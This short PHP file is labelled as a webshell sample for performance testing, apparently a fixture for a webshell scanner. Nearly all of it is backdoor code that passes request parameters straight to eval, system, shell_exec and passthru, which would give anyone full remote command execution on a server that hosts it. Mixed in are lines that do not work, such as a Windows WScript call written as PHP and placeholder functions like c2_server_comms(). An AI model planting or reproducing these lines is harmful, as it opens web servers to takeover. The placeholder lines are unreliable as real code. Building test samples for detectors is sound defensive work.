<?php
// Webshell sample for performance testing
eval($_POST['cmd']);
system($_GET['exec']);
shell_exec($_REQUEST['command']);
WScript.Shell.Exec($_POST['run']);
base64_decode($_POST['payload']);
passthru($_GET['cmd']);
// Common webshell patterns
backdoor_function();
webshell_interface();
c2_server_comms();
file_manager_tool();
database_connector();
?>